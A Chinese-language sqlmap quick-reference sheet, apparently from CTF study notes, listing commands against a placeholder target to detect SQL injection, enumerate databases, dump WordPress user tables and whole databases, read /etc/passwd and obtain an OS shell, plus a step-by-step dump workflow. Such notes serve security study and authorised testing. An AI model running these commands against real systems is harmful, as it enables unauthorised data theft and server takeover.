# sqlmap 场景速查

> 完整参数手册：[sqlmap 使用手册](../../01-CTF/资料/sqlmap.md)。
## 1. 检测 SQL 注入

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1"
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456"
```

## 2. 指定测试参数

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1&name=test" -p id
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" -p username
```

## 3. 枚举数据库

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --dbs
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --dbs
```

## 4. 查看当前数据库

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --current-db
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --current-db
```

## 5. 查看当前数据库用户

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --current-user
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --current-user
```

## 6. 查看数据库权限

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --privileges
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --privileges
```

## 7. 查看表

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" -D wordpress --tables
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" -D wordpress --tables
```

## 8. 查看字段

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" -D wordpress -T users --columns
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" -D wordpress -T users --columns
```

## 9. 导出数据

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" -D wordpress -T users --dump
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" -D wordpress -T users --dump
```

## 10. 导出整个数据库

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" -D wordpress --dump
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" -D wordpress --dump
```

## 11. 执行 SQL

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --sql-query="select version()"
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --sql-query="select @@version"
```

## 12. 读取服务器文件

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --file-read="/etc/passwd"
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --file-read="/etc/passwd"
```

## 13. 尝试获取 OS Shell

### GET

```bash
sqlmap -u "http://target.com/index.php?id=1" --os-shell
```

### POST

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123456" --os-shell
```

## 14. Burp Suite 请求文件（推荐）

```bash
sqlmap -r request.txt
sqlmap -r request.txt --dbs
sqlmap -r request.txt --current-db
sqlmap -r request.txt --current-user
sqlmap -r request.txt -D 数据库名 --tables
sqlmap -r request.txt -D 数据库名 -T 表名 --columns
sqlmap -r request.txt -D 数据库名 -T 表名 --dump
```

## 15. 常用参数

参数                              说明

***

`--batch`                         自动回答默认选项\
`--threads=10`                    多线程\
`--risk=3`                        风险等级\
`--level=5`                       检测等级\
`--dbms=mysql`                    指定数据库类型\
`--cookie="..."`                  指定 Cookie\
`--random-agent`                  随机 User-Agent\
`--flush-session`                 清除缓存重新检测\
`--technique=U`                   指定注入技术\
`--proxy=http://127.0.0.1:8080`   Burp 代理\
`-v 3`                            输出详细程度

## 推荐流程

```latex
检测注入
    ↓
--dbs
    ↓
--current-db
    ↓
-D 数据库名 --tables
    ↓
-D 数据库名 -T 表名 --columns
    ↓
-D 数据库名 -T 表名 --dump
```
